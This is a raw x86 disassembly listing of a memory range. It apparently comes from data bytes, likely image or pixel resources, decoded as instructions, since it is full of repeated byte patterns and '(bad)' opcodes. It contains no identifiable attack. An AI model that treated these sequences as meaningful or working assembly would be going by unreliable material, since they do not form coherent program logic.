11014c21:	cli    
11014c22:	cli    
11014c23:	jmp    DWORD PTR [ebp+0x65]
11014c26:	inc    DWORD PTR gs:[eax]
11014c29:	add    BYTE PTR [eax],al
11014c2b:	std    
11014c2c:	add    BYTE PTR [eax],al
11014c2e:	add    cl,ah
11014c30:	add    BYTE PTR [eax],al
11014c32:	add    cl,al
11014c34:	add    BYTE PTR [eax],al
11014c36:	add    BYTE PTR [ecx-0x79000000],ah
11014c3c:	add    BYTE PTR [eax],al
11014c3e:	add    BYTE PTR [esi+0x0],dh
11014c41:	add    BYTE PTR [eax],al
11014c43:	outs   dx,BYTE PTR ds:[esi]
11014c44:	add    BYTE PTR [eax],al
11014c46:	add    BYTE PTR [eax+eax*1+0x0],ch
11014c4a:	add    BYTE PTR [eax+eax*1+0x0],ch
11014c4e:	add    BYTE PTR [eax+eax*1+0x0],ch
11014c52:	add    BYTE PTR [eax+eax*1+0x0],ch
11014c56:	add    BYTE PTR [edx+0x0],ch
11014c59:	add    BYTE PTR [eax],al
11014c5b:	arpl   WORD PTR [eax],ax
11014c5d:	add    BYTE PTR [eax],al
11014c5f:	dec    esi
11014c60:	add    BYTE PTR [eax],al
11014c62:	add    BYTE PTR [esi],ch
11014c64:	add    BYTE PTR [eax],al
11014c66:	add    BYTE PTR [edx],dl
11014c68:	add    BYTE PTR [eax],al
11014c6a:	add    BYTE PTR [eax+eax*1],al
	...
11014c7d:	add    BYTE PTR [eax],al
11014c7f:	add    eax,DWORD PTR [eax]
11014c81:	add    BYTE PTR [eax],al
11014c83:	adc    BYTE PTR [eax],al
11014c85:	add    BYTE PTR [eax],al
11014c87:	xor    eax,DWORD PTR [eax]
11014c89:	add    BYTE PTR [eax],al
11014c8b:	push   0x0
11014c8d:	add    BYTE PTR [eax],al
11014c8f:	call   0x0:0xb1000000
11014c96:	add    BYTE PTR [edi-0x47000000],dh
11014c9c:	add    BYTE PTR [eax],al
11014c9e:	add    BYTE PTR [ebp-0x3c000000],bh
11014ca4:	add    BYTE PTR [eax],al
11014ca6:	add    cl,dl
11014ca8:	add    BYTE PTR [eax],al
11014caa:	add    al,ah
11014cac:	add    BYTE PTR [eax],al
11014cae:	add    al,dh
11014cb0:	add    BYTE PTR [eax],al
11014cb2:	add    dh,bh
11014cb4:	addr16 addr16 addr16 (bad) 
11014cb8:	sti    
11014cb9:	sti    
11014cba:	sti    
11014cbb:	(bad)  
11014cbc:	std    
11014cbd:	std    
11014cbe:	std    
11014cbf:	(bad)  
11014cc0:	std    
11014cc1:	std    
11014cc2:	std    
11014cc3:	(bad)  
11014cc4:	sti    
11014cc5:	sti    
11014cc6:	sti    
11014cc7:	jmp    DWORD PTR [ebp+0x65]
11014cca:	inc    DWORD PTR gs:[eax]
11014ccd:	add    BYTE PTR [eax],al
11014ccf:	inc    BYTE PTR [eax]
11014cd1:	add    BYTE PTR [eax],al
11014cd3:	lock add BYTE PTR [eax],al
11014cd6:	add    al,ah
11014cd8:	add    BYTE PTR [eax],al
11014cda:	add    cl,dl
11014cdc:	add    BYTE PTR [eax],al
11014cde:	add    ah,al
11014ce0:	add    BYTE PTR [eax],al
11014ce2:	add    BYTE PTR [eax+eax*1+0xb90000],bh
11014ce9:	add    BYTE PTR [eax],al
11014ceb:	mov    eax,0xb8000000
11014cf0:	add    BYTE PTR [eax],al
11014cf2:	add    BYTE PTR [eax-0x4b000000],bh
11014cf8:	add    BYTE PTR [eax],al
11014cfa:	add    BYTE PTR [eax-0x7c000000],ch
11014d00:	add    BYTE PTR [eax],al
11014d02:	add    BYTE PTR [esi+0x0],cl
11014d05:	add    BYTE PTR [eax],al
11014d07:	push   ds
11014d08:	add    BYTE PTR [eax],al
11014d0a:	add    BYTE PTR [edi],al
11014d0c:	add    BYTE PTR [eax],al
11014d0e:	add    BYTE PTR [ecx],al
	...
11014d1c:	add    BYTE PTR [eax],al
11014d1e:	add    BYTE PTR [ebx],al
11014d20:	add    BYTE PTR [eax],al
11014d22:	add    BYTE PTR [eax+eax*1],dl
11014d25:	add    BYTE PTR [eax],al
11014d27:	inc    DWORD PTR [eax]
11014d29:	add    BYTE PTR [eax],al
11014d2b:	inc    DWORD PTR [eax]
11014d2d:	add    BYTE PTR [eax],al
11014d2f:	inc    DWORD PTR [eax]
11014d31:	add    BYTE PTR [eax],al
11014d33:	inc    DWORD PTR [eax]
11014d35:	add    BYTE PTR [eax],al
11014d37:	inc    DWORD PTR [eax]
11014d39:	add    BYTE PTR [eax],al
11014d3b:	inc    DWORD PTR [eax]
11014d3d:	add    BYTE PTR [eax],al
11014d3f:	inc    DWORD PTR [eax]
11014d41:	add    BYTE PTR [eax],al
11014d43:	inc    DWORD PTR [eax]
11014d45:	add    BYTE PTR [eax],al
11014d47:	inc    DWORD PTR [eax]
11014d49:	add    BYTE PTR [eax],al
11014d4b:	inc    DWORD PTR [eax]
11014d4d:	add    BYTE PTR [eax],al
11014d4f:	jmp    FWORD PTR [eax+0x68]
11014d52:	push   0xfbfbfbff
11014d57:	(bad)  
11014d58:	std    
11014d59:	std    
11014d5a:	std    
11014d5b:	(bad)  
11014d5c:	std    
11014d5d:	std    
11014d5e:	std    
11014d5f:	(bad)  
11014d60:	std    
11014d61:	std    
11014d62:	std    
11014d63:	(bad)  
11014d64:	std    
11014d65:	std    
11014d66:	std    
11014d67:	(bad)  
11014d68:	sti    
11014d69:	sti    
11014d6a:	sti    
11014d6b:	jmp    DWORD PTR [ebp+0x65]
11014d6e:	inc    DWORD PTR gs:[eax]
11014d71:	add    BYTE PTR [eax],al
11014d73:	inc    DWORD PTR [eax]
11014d75:	add    BYTE PTR [eax],al
11014d77:	inc    DWORD PTR [eax]
11014d79:	add    BYTE PTR [eax],al
11014d7b:	inc    DWORD PTR [eax]
11014d7d:	add    BYTE PTR [eax],al
11014d7f:	inc    DWORD PTR [eax]
11014d81:	add    BYTE PTR [eax],al
11014d83:	inc    DWORD PTR [eax]
11014d85:	add    BYTE PTR [eax],al
11014d87:	inc    DWORD PTR [eax]
11014d89:	add    BYTE PTR [eax],al
11014d8b:	inc    DWORD PTR [eax]
11014d8d:	add    BYTE PTR [eax],al
11014d8f:	inc    DWORD PTR [eax]
11014d91:	add    BYTE PTR [eax],al
11014d93:	inc    DWORD PTR [eax]
11014d95:	add    BYTE PTR [eax],al
11014d97:	inc    DWORD PTR [eax]
11014d99:	add    BYTE PTR [eax],al
11014d9b:	inc    DWORD PTR [eax]
11014d9d:	add    BYTE PTR [eax],al
11014d9f:	test   al,0x0
11014da1:	add    BYTE PTR [eax],al
11014da3:	arpl   WORD PTR [eax],ax
11014da5:	add    BYTE PTR [eax],al
11014da7:	add    BYTE PTR es:[eax],al
11014daa:	add    BYTE PTR [ecx],cl
11014dac:	add    BYTE PTR [eax],al
11014dae:	add    BYTE PTR [ecx],al
	...
11014dbc:	add    BYTE PTR [eax],al
11014dbe:	add    BYTE PTR [ebx],al
11014dc0:	add    BYTE PTR [eax],al
11014dc2:	add    BYTE PTR ds:0xff000000,dl
11014dc8:	mov    DWORD PTR [ebp+0x33],ecx
11014dcb:	push   DWORD PTR [esi-0x4d00bb9a]
11014dd1:	fs inc edx
11014dd3:	jmp    DWORD PTR [edi-0x6f00c1a2]
11014dd9:	push   ecx
11014dda:	xor    eax,0x283d6dff
11014ddf:	inc    DWORD PTR [ebp+0x27]
11014de2:	sbb    edi,edi
11014de4:	sbb    al,0x10
11014de6:	or     bh,bh
11014de8:	add    BYTE PTR [eax],al
11014dea:	add    bh,bh
11014dec:	push   0xfbff6868
11014df1:	sti    
11014df2:	cli    
11014df3:	(bad)  
11014df4:	(bad)  
11014df5:	(bad)  
11014df6:	(bad)  
11014df7:	(bad)  
11014df8:	std    
11014df9:	std    
11014dfa:	std    
11014dfb:	(bad)  
11014dfc:	(bad)  
11014dfd:	(bad)  
11014dfe:	(bad)  
11014dff:	(bad)  
11014e00:	std    
11014e01:	std    
11014e02:	std    
11014e03:	(bad)  
11014e04:	(bad)  
11014e05:	(bad)  
11014e06:	(bad)  
11014e07:	(bad)  
11014e08:	(bad)  
11014e09:	(bad)  
11014e0a:	(bad)  
11014e0b:	(bad)  
11014e0c:	sti    
11014e0d:	sti    
11014e0e:	cli    
11014e0f:	jmp    DWORD PTR [ebp+0x65]
11014e12:	inc    DWORD PTR gs:[eax]
11014e15:	add    BYTE PTR [eax],al
11014e17:	call   FWORD PTR [edi+ecx*1]
11014e1a:	or     bh,bh
11014e1c:	inc    ebp
11014e1d:	daa    
11014e1e:	sbb    edi,edi
11014e20:	ins    DWORD PTR es:[edi],dx
11014e21:	cmp    eax,0x5190ff28
11014e26:	xor    eax,0x3e5ea7ff
11014e2b:	push   DWORD PTR [edx-0x4900bd9c]
11014e31:	inc    sp
11014e33:	dec    DWORD PTR [ecx+0xff334d]
11014e39:	add    BYTE PTR [eax],al
11014e3b:	inc    DWORD PTR [eax]
11014e3d:	add    BYTE PTR [eax],al
11014e3f:	mov    ch,0x0
11014e41:	add    BYTE PTR [eax],al
11014e43:	push   0x0
11014e45:	add    BYTE PTR [eax],al
11014e47:	sub    DWORD PTR [eax],eax
11014e49:	add    BYTE PTR [eax],al
11014e4b:	or     al,BYTE PTR [eax]
11014e4d:	add    BYTE PTR [eax],al
11014e4f:	add    DWORD PTR [eax],eax
	...
11014e5d:	add    BYTE PTR [eax],al
11014e5f:	add    eax,DWORD PTR [eax]
11014e61:	add    BYTE PTR [eax],al
11014e63:	push   ss
11014e64:	add    BYTE PTR [eax],al
11014e66:	add    bh,bh
11014e68:	mov    dh,0x66
11014e6a:	inc    esp
11014e6b:	(bad)  
11014e6c:	out    dx,al
11014e6d:	xchg   DWORD PTR [eax-0x1],ebx
11014e70:	loope  0x11014ef1
11014e72:	push   ebx
11014e73:	inc    ebp
11014e75:	outs   dx,DWORD PTR ds:[esi]
11014e76:	dec    ecx
11014e77:	call   FWORD PTR [eax+0x63ff3856]
11014e7d:	cmp    BYTE PTR [edi+edi*8],ah
11014e80:	sub    eax,0x2ff1019
11014e85:	add    DWORD PTR [ecx],eax
11014e87:	jmp    DWORD PTR [edi+0x67]
11014e8a:	addr16 (bad) 
11014e8c:	sti    
11014e8d:	sti    
11014e8e:	sti    
11014e8f:	(bad)  
11014e90:	(bad)  
11014e91:	(bad)  
11014e92:	std    
11014e93:	(bad)  
11014e94:	(bad)  
11014e95:	(bad)  
11014e96:	std    
11014e97:	(bad)  
11014e98:	(bad)  
11014e99:	(bad)  
11014e9a:	std    
11014e9b:	(bad)  
11014e9c:	(bad)  
11014e9d:	(bad)  
11014e9e:	std    
11014e9f:	(bad)  
11014ea0:	std    
11014ea1:	std    
11014ea2:	std    
11014ea3:	(bad)  
11014ea4:	(bad)  
11014ea5:	(bad)  
11014ea6:	(bad)  
11014ea7:	(bad)  
11014ea8:	(bad)  
11014ea9:	(bad)  
11014eaa:	(bad)  
11014eab:	(bad)  
11014eac:	(bad)  
11014ead:	(bad)  
11014eae:	std    
11014eaf:	(bad)  
11014eb0:	sti    
11014eb1:	sti    
11014eb2:	sti    
11014eb3:	jmp    DWORD PTR [ebp+0x65]
11014eb6:	inc    DWORD PTR gs:[edx]
11014eb9:	add    DWORD PTR [ecx],eax
11014ebb:	jmp    FWORD PTR ds:0x63ff1019
11014ec1:	cmp    BYTE PTR [edi+edi*8],ah
11014ec4:	cwde   
11014ec5:	push   esi
11014ec6:	cmp    bh,bh
11014ec8:	lds    ebp,FWORD PTR [edi+0x49]
11014ecb:	jmp    ecx
11014ecd:	jg     0x11014f22
11014ecf:	(bad)  
11014ed0:	out    dx,al
11014ed1:	xchg   BYTE PTR [eax-0x1],bl
11014ed4:	mov    dh,0x66
11014ed6:	inc    esp
11014ed7:	inc    DWORD PTR [eax]
11014ed9:	add    BYTE PTR [eax],al
11014edb:	inc    DWORD PTR [eax]
11014edd:	add    BYTE PTR [eax],al
11014edf:	mov    eax,0x6c000000
11014ee4:	add    BYTE PTR [eax],al
11014ee6:	add    BYTE PTR [edx],ch
11014ee8:	add    BYTE PTR [eax],al
11014eea:	add    BYTE PTR [edx],cl
11014eec:	add    BYTE PTR [eax],al
11014eee:	add    BYTE PTR [ecx],al
	...
11014efc:	add    BYTE PTR [eax],al
11014efe:	add    BYTE PTR [ebx],al
11014f00:	add    BYTE PTR [eax],al
11014f02:	add    BYTE PTR [esi],dl
11014f04:	add    BYTE PTR [eax],al
11014f06:	add    bh,bh
11014f08:	mov    dl,0x64
11014f0a:	inc    edx
11014f0b:	jmp    ecx
11014f0d:	jg     0x11014f62
11014f0f:	inc    ebp
11014f11:	outs   dx,DWORD PTR ds:[esi]
11014f12:	dec    ecx
11014f13:	call   FWORD PTR [eax+0x63ff3856]
11014f19:	cmp    BYTE PTR [edi+edi*8],ah
11014f1c:	sub    eax,0x2ff1019
11014f21:	add    DWORD PTR [ecx],eax
11014f23:	jmp    FWORD PTR [eax+0x68]
11014f26:	push   0xfbfbfbff
11014f2b:	(bad)  
11014f2c:	(bad)  
11014f2d:	(bad)  
11014f2e:	std    
11014f2f:	(bad)  
11014f30:	(bad)  
11014f31:	(bad)  
11014f32:	(bad)  
11014f33:	(bad)  
11014f34:	(bad)  
11014f35:	(bad)  
11014f36:	std    
11014f37:	(bad)  
11014f38:	(bad)  
11014f39:	(bad)  
11014f3a:	std    
11014f3b:	(bad)  
11014f3c:	(bad)  
11014f3d:	(bad)  
11014f3e:	std    
11014f3f:	(bad)  
11014f40:	std    
11014f41:	std    
11014f42:	std    
11014f43:	(bad)  
11014f44:	(bad)  
11014f45:	(bad)  
11014f46:	(bad)  
11014f47:	(bad)  
11014f48:	(bad)  
11014f49:	(bad)  
11014f4a:	(bad)  
11014f4b:	(bad)  
11014f4c:	(bad)  
11014f4d:	(bad)  
11014f4e:	(bad)  
11014f4f:	(bad)  
11014f50:	std    
11014f51:	std    
11014f52:	std    
11014f53:	(bad)  
11014f54:	sti    
11014f55:	sti    
11014f56:	sti    
11014f57:	jmp    DWORD PTR [ebp+0x65]
11014f5a:	inc    DWORD PTR gs:[edx]
11014f5d:	add    DWORD PTR [ecx],eax
11014f5f:	jmp    FWORD PTR [esi]
11014f61:	sbb    DWORD PTR [eax],edx
11014f63:	jmp    DWORD PTR [ebx+0x38]
11014f66:	and    al,0xff
11014f68:	cdq    
11014f69:	push   esi
11014f6a:	cmp    bh,bh
11014f6c:	lds    ebp,FWORD PTR [edi+0x49]
11014f6f:	jmp    ecx
11014f71:	jg     0x11014fc7
11014f73:	push   DWORD PTR [edx+0xff4264]
11014f79:	add    BYTE PTR [eax],al
11014f7b:	inc    DWORD PTR [eax]
11014f7d:	add    BYTE PTR [eax],al
11014f7f:	mov    eax,0x6c000000
11014f84:	add    BYTE PTR [eax],al
11014f86:	add    BYTE PTR [edx],ch
11014f88:	add    BYTE PTR [eax],al
11014f8a:	add    BYTE PTR [edx],cl
11014f8c:	add    BYTE PTR [eax],al
11014f8e:	add    BYTE PTR [ecx],al
	...
11014f9c:	add    BYTE PTR [eax],al
11014f9e:	add    BYTE PTR [ebx],al
11014fa0:	add    BYTE PTR [eax],al
11014fa2:	add    BYTE PTR [esi],dl
11014fa4:	add    BYTE PTR [eax],al
11014fa6:	add    bh,bh
11014fa8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
11014fa9:	pop    esi
11014faa:	ds inc ebp
11014fad:	outs   dx,DWORD PTR ds:[esi]
11014fae:	dec    ecx
11014faf:	call   FWORD PTR [eax+0x64ff3856]
11014fb5:	cmp    BYTE PTR [edi+edi*8],ah
11014fb8:	sub    eax,0x2ff1019
11014fbd:	add    DWORD PTR [eax],eax
11014fbf:	jmp    DWORD PTR [edi+0x67]
11014fc2:	addr16 (bad) 
11014fc4:	sti    
11014fc5:	sti    
11014fc6:	sti    
11014fc7:	(bad)  
11014fc8:	std    
11014fc9:	std    
11014fca:	std    
11014fcb:	(bad)  
11014fcc:	std    
11014fcd:	std    
11014fce:	std    
11014fcf:	(bad)  
11014fd0:	(bad)  
11014fd1:	(bad)  
11014fd2:	std    
11014fd3:	(bad)  
11014fd4:	(bad)  
11014fd5:	(bad)  
11014fd6:	std    
11014fd7:	(bad)  
11014fd8:	std    
11014fd9:	std    
11014fda:	std    
11014fdb:	(bad)  
11014fdc:	std    
11014fdd:	std    
11014fde:	std    
11014fdf:	(bad)  
11014fe0:	std    
11014fe1:	std    
11014fe2:	std    
11014fe3:	(bad)  
11014fe4:	std    
11014fe5:	std    
11014fe6:	std    
11014fe7:	(bad)  
11014fe8:	std    
11014fe9:	std    
11014fea:	std    
11014feb:	(bad)  
11014fec:	(bad)  
11014fed:	(bad)  
11014fee:	std    
11014fef:	(bad)  
11014ff0:	std    
11014ff1:	std    
11014ff2:	std    
11014ff3:	(bad)  
11014ff4:	std    
11014ff5:	std    
11014ff6:	std    
11014ff7:	(bad)  
11014ff8:	cli    
11014ff9:	cli    
11014ffa:	cli    
11014ffb:	jmp    DWORD PTR [ebp+0x65]
11014ffe:	inc    DWORD PTR gs:[edx]
11015001:	add    DWORD PTR [ecx],eax
11015003:	jmp    FWORD PTR [esi]
11015005:	sbb    dl,BYTE PTR [eax]
11015007:	jmp    DWORD PTR [eax+edi*1+0x25]
1101500b:	call   FWORD PTR [ecx-0x3a00c7aa]
11015011:	outs   dx,DWORD PTR ds:[esi]
11015012:	dec    ecx
11015013:	jmp    DWORD PTR [edi+0xff3e5e]
11015019:	add    BYTE PTR [eax],al
1101501b:	inc    DWORD PTR [eax]
1101501d:	add    BYTE PTR [eax],al
1101501f:	mov    eax,0x6c000000
11015024:	add    BYTE PTR [eax],al
11015026:	add    BYTE PTR [edx],ch
11015028:	add    BYTE PTR [eax],al
1101502a:	add    BYTE PTR [edx],cl
1101502c:	add    BYTE PTR [eax],al
1101502e:	add    BYTE PTR [ecx],al
	...
1101503c:	add    BYTE PTR [eax],al
1101503e:	add    BYTE PTR [eax+eax*1],al
11015041:	add    BYTE PTR [eax],al
11015043:	sbb    al,BYTE PTR [eax]
11015045:	add    BYTE PTR [eax],al
11015047:	call   DWORD PTR [eax-0x6700caaf]
1101504d:	push   esi
1101504e:	cmp    bh,bh
11015050:	arpl   WORD PTR [edi],si
11015052:	and    al,0xff
11015054:	sub    eax,0x2ff1019
11015059:	add    DWORD PTR [ecx],eax
1101505b:	jmp    FWORD PTR [eax+0x68]
1101505e:	push   0xfbfbfbff
11015063:	(bad)  
11015064:	(bad)  
11015065:	(bad)  
11015066:	(bad)  
11015067:	(bad)  
11015068:	(bad)  
11015069:	(bad)  
1101506a:	std    
1101506b:	(bad)  
1101506c:	std    
1101506d:	cli    
1101506e:	clc    
1101506f:	push   esp
11015071:	into   
11015072:	sar    bh,0xe9
11015075:	lahf   
11015076:	test   bh,bh
11015078:	fistp  QWORD PTR [esi+0x5a]
1101507b:	(bad)  
1101507c:	fsubr  DWORD PTR [ebx+0x44]
1101507f:	call   ebp
11015081:	addr16 inc ecx
11015083:	call   edi
11015085:	jae    0x110150d9
11015087:	(bad)  
11015088:	ficom  WORD PTR [edx-0x3a120087]
1101508e:	mov    eax,0xf7f9fcff
11015093:	(bad)  
11015094:	(bad)  
11015095:	(bad)  
11015096:	std    
11015097:	(bad)  
11015098:	std    
11015099:	std    
1101509a:	std    
1101509b:	(bad)  
1101509c:	sti    
1101509d:	sti    
1101509e:	sti    
1101509f:	jmp    DWORD PTR [ebp+0x65]
110150a2:	inc    DWORD PTR gs:[edx]
110150a5:	add    DWORD PTR [ecx],eax
110150a7:	jmp    FWORD PTR ds:0x63ff1019
110150ad:	aaa    
110150ae:	and    al,0xff
110150b0:	cwde   
110150b1:	push   esi
110150b2:	cmp    bh,bh
110150b4:	nop
110150b5:	push   ecx
110150b6:	xor    eax,0xff
110150bb:	inc    DWORD PTR [eax]
110150bd:	add    BYTE PTR [eax],al
110150bf:	mov    ecx,0x6c000000
110150c4:	add    BYTE PTR [eax],al
110150c6:	add    BYTE PTR [edx],ch
110150c8:	add    BYTE PTR [eax],al
110150ca:	add    BYTE PTR [edx],cl
110150cc:	add    BYTE PTR [eax],al
110150ce:	add    BYTE PTR [ecx],al
	...
110150d8:	add    BYTE PTR [eax],al
110150da:	add    BYTE PTR [ecx],al
110150dc:	add    BYTE PTR [eax],al
110150de:	add    BYTE PTR [ecx],cl
110150e0:	add    BYTE PTR [eax],al
110150e2:	add    BYTE PTR [edi],ah
110150e4:	add    BYTE PTR [eax],al
110150e6:	add    bh,bh
110150e8:	ins    DWORD PTR es:[edi],dx
110150e9:	cmp    eax,0x3863ff28
110150ee:	and    al,0xff
110150f0:	sub    eax,0x2ff1019
110150f5:	add    DWORD PTR [ecx],eax
110150f7:	jmp    FWORD PTR [eax+0x68]
110150fa:	push   0xfbfbfbff
110150ff:	(bad)  
11015100:	(bad)  
11015101:	(bad)  
11015102:	std    
11015103:	(bad)  
11015104:	(bad)  
11015105:	(bad)  
11015106:	(bad)  
11015107:	(bad)  
11015108:	clc    
11015109:	aad    0xc6
1101510b:	(bad)  
1101510c:	jmp    0x4975:0xe2ff638a
11015113:	(bad)  
11015114:	fbstp  TBYTE PTR [eax+0x45]
11015117:	(bad)  
11015118:	fsubr  QWORD PTR [edx+eax*2-0x1]
1101511c:	fldcw  WORD PTR [eax+0x3f]
1101511f:	call   esi
11015121:	fs cmp al,0xff
11015124:	rcr    BYTE PTR [edi+0x38],cl
11015127:	dec    edi
11015129:	pop    ebx
1101512a:	xor    eax,0x3157ccff
1101512f:	call   eax
11015131:	imul   ecx,DWORD PTR [ecx-0x1],0xffbbc7ed
11015138:	(bad)  
11015139:	(bad)  
1101513a:	std    
1101513b:	(bad)  
1101513c:	(bad)  
1101513d:	(bad)  
1101513e:	(bad)  
1101513f:	(bad)  
11015140:	sti    
11015141:	sti    
11015142:	sti    
11015143:	jmp    DWORD PTR [ebp+0x65]
11015146:	inc    DWORD PTR gs:[edx]
11015149:	add    DWORD PTR [eax],eax
1101514b:	jmp    FWORD PTR ds:0x63ff1019
11015151:	cmp    BYTE PTR [edi+edi*8],ah
11015154:	ins    DWORD PTR es:[edi],dx
11015155:	cmp    eax,0xff28
1101515a:	add    bh,bh
1101515c:	add    BYTE PTR [eax],al
1101515e:	add    BYTE PTR [ebp+0x6e000000],bh
11015164:	add    BYTE PTR [eax],al
11015166:	add    BYTE PTR [edx],ch
11015168:	add    BYTE PTR [eax],al
1101516a:	add    BYTE PTR [edx],cl
1101516c:	add    BYTE PTR [eax],al
1101516e:	add    BYTE PTR [ecx],al
11015170:	add    BYTE PTR [eax],al
11015172:	add    BYTE PTR [eax],al
11015174:	add    BYTE PTR [eax],al
11015176:	add    BYTE PTR [ecx],al
11015178:	add    BYTE PTR [eax],al
1101517a:	add    BYTE PTR ds:0x17000000,al
11015180:	add    BYTE PTR [eax],al
11015182:	add    BYTE PTR [edx+0x0],al
11015185:	add    BYTE PTR [eax],al
11015187:	inc    DWORD PTR [ebp+0x27]
1101518a:	sbb    edi,edi
1101518c:	sub    eax,0x2ff1019
11015191:	add    DWORD PTR [ecx],eax
11015193:	jmp    DWORD PTR [edi+0x67]
11015196:	addr16 (bad) 
11015198:	cld    
11015199:	cld    
1101519a:	cld    
1101519b:	(bad)  
1101519c:	(bad)  
1101519d:	(bad)  
1101519e:	(bad)  
1101519f:	(bad)  
110151a0:	std    
110151a1:	cld    
110151a2:	cld    
110151a3:	push   edi
110151a5:	mov    ebx,0x82ecffa1
110151aa:	push   esp
110151ab:	(bad)  
110151ac:	jmp    0xf700a22e
110151b1:	jp     0x11015200
110151b3:	jmp    edx
110151b5:	jne    0x11015201
110151b7:	jmp    eax
110151b9:	jno    0x11015202
110151bb:	(bad)  
110151bc:	(bad)  [ebp+0x44]
110151bf:	(bad)  
110151c0:	fldcw  WORD PTR [ecx+0x40]
110151c3:	call   ebp
110151c5:	fs cmp al,0xff
110151c8:	rcr    BYTE PTR [edi+0x39],cl
110151cb:	dec    edi
110151cd:	pop    ebx
110151ce:	xor    eax,0x3157ccff
110151d3:	dec    ecx
110151d5:	push   ebx
110151d6:	das    
110151d7:	jmp    eax
110151d9:	popf   
110151da:	mov    edi,edi
110151dc:	std    
110151dd:	cld    
110151de:	cld    
110151df:	(bad)  
110151e0:	(bad)  
110151e1:	(bad)  
110151e2:	(bad)  
110151e3:	(bad)  
110151e4:	sti    
110151e5:	sti    
110151e6:	sti    
110151e7:	jmp    DWORD PTR [ebp+0x65]
110151ea:	inc    DWORD PTR gs:[edx]
110151ed:	add    DWORD PTR [ecx],eax
110151ef:	jmp    FWORD PTR ds:0x45ff1019
110151f5:	daa    
110151f6:	sbb    edi,edi
110151f8:	add    BYTE PTR [eax],al
110151fa:	add    bh,bh
110151fc:	add    BYTE PTR [eax],al
110151fe:	add    ah,al
11015200:	add    BYTE PTR [eax],al
11015202:	add    BYTE PTR [esi+0x0],dh
11015205:	add    BYTE PTR [eax],al
11015207:	add    BYTE PTR cs:[eax],al
1101520a:	add    BYTE PTR [edx],cl
1101520c:	add    BYTE PTR [eax],al
1101520e:	add    BYTE PTR [ecx],al
11015210:	add    BYTE PTR [eax],al
11015212:	add    BYTE PTR [eax],al
11015214:	add    BYTE PTR [eax],al
11015216:	add    BYTE PTR ds:0x13000000,al
1101521c:	add    BYTE PTR [eax],al
1101521e:	add    BYTE PTR [ebx],dh
11015220:	add    BYTE PTR [eax],al
11015222:	add    BYTE PTR [eax+eax*1+0x0],ch
11015226:	add    bh,bh
11015228:	sbb    al,0x10
1101522a:	or     bh,bh
1101522c:	add    al,BYTE PTR [ecx]
1101522e:	add    edi,edi
11015230:	push   0xfbff6868
11015235:	sti    
11015236:	sti    
11015237:	(bad)  
11015238:	(bad)  
11015239:	(bad)  
1101523a:	std    
1101523b:	(bad)  
1101523c:	(bad)  
1101523d:	(bad)  
1101523e:	std    
1101523f:	(bad)  
11015240:	stc    
11015241:	mov    esi,0x8af2ffa4
11015246:	pop    ebx
11015247:	(bad)  
11015248:	out    dx,eax
11015249:	xchg   BYTE PTR [eax-0x1],bl
1101524c:	in     al,dx
1101524d:	adc    DWORD PTR [esi-0x1],0xffffffe9
11015251:	jg     0x110152a6
11015253:	jmp    esi
11015255:	jnp    0x110152a6
11015257:	jmp    ebx
11015259:	ja     0x110152a7
1101525b:	jmp    eax
1101525d:	jb     0x110152a7
1101525f:	(bad)  
11015260:	(bad)  [esi+0x45]
11015263:	(bad)  
11015264:	fldcw  WORD PTR [ecx+0x40]
11015267:	call   esi
11015269:	gs cmp al,0xff
1101526c:	shl    DWORD PTR [eax+0x39],cl
1101526f:	dec    edi
11015271:	pop    ebx
11015272:	xor    eax,0x3157ccff
11015277:	dec    ecx
11015279:	push   ebx
1101527a:	cs jmp eax
1101527d:	popf   
1101527e:	mov    edi,edi
11015280:	(bad)  
11015281:	(bad)  
11015282:	std    
11015283:	(bad)  
11015284:	(bad)  
11015285:	(bad)  
11015286:	std    
11015287:	(bad)  
11015288:	sti    
11015289:	sti    
1101528a:	cli    
1101528b:	jmp    DWORD PTR [esi+0x66]
1101528e:	inc    DWORD PTR gs:[edx]
11015291:	add    DWORD PTR [ecx],eax
11015293:	call   FWORD PTR [eax+edx*1]
11015296:	or     bh,bh
11015298:	add    BYTE PTR [eax],al
1101529a:	add    bh,bh
1101529c:	add    BYTE PTR [eax],al
1101529e:	add    cl,dl
110152a0:	add    BYTE PTR [eax],al
110152a2:	add    BYTE PTR [edi+0x39000000],al
110152a8:	add    BYTE PTR [eax],al
110152aa:	add    BYTE PTR [esi],cl
110152ac:	add    BYTE PTR [eax],al
110152ae:	add    BYTE PTR [ecx],al
110152b0:	add    BYTE PTR [eax],al
110152b2:	add    BYTE PTR ds:0x13000000,al
110152b8:	add    BYTE PTR [eax],al
110152ba:	add    BYTE PTR [eax],dh
110152bc:	add    BYTE PTR [eax],al
110152be:	add    BYTE PTR [ecx+0x0],ah
110152c1:	add    BYTE PTR [eax],al
110152c3:	sahf   
110152c4:	add    BYTE PTR [eax],al
110152c6:	add    bh,bh
110152c8:	add    BYTE PTR [eax],al
110152ca:	add    bh,bh
110152cc:	addr16 addr16 addr16 (bad) 
110152d0:	sti    
110152d1:	sti    
110152d2:	sti    
110152d3:	(bad)  
110152d4:	(bad)  
110152d5:	(bad)  
110152d6:	std    
110152d7:	(bad)  
110152d8:	(bad)  
110152d9:	(bad)  
110152da:	std    
110152db:	(bad)  
110152dc:	sti    
110152dd:	fcmove st,st(2)
110152df:	push   ebx
110152e1:	mov    WORD PTR [esi-0x1],ds
110152e4:	repz mov WORD PTR [esi-0x1],ds
110152e8:	repnz mov WORD PTR [esi-0x1],ds
110152ec:	lock mov DWORD PTR [edi+edi*8-0x13],ebx
110152f1:	test   DWORD PTR [eax-0x1],ebx
110152f4:	jmp    0xf900a879
110152f9:	jl     0x1101534c
110152fb:	jmp    esp
110152fd:	js     0x1101534c
110152ff:	jmp    eax
11015301:	jae    0x1101534c
11015303:	(bad)  
11015304:	(bad)  [esi+0x45]
11015307:	(bad)  
11015308:	fisubr DWORD PTR [ecx+0x41]
1101530b:	call   esi
1101530d:	gs cmp eax,0x3960d3ff
11015313:	dec    edi
11015315:	pop    ebx
11015316:	ss dec esp
11015319:	push   edi
1101531a:	xor    edi,edi
1101531c:	leave  
1101531d:	push   esp
1101531e:	das    
1101531f:	(bad)  
11015320:	in     eax,dx
11015321:	(bad)  
11015322:	mov    ebx,0xfdfefeff
11015327:	(bad)  
11015328:	std    
11015329:	std    
1101532a:	std    
1101532b:	(bad)  
1101532c:	sti    
1101532d:	sti    
1101532e:	sti    
1101532f:	jmp    DWORD PTR [ebp+0x65]
11015332:	inc    DWORD PTR gs:[eax]
11015335:	add    BYTE PTR [eax],al
11015337:	inc    DWORD PTR [eax]
11015339:	add    BYTE PTR [eax],al
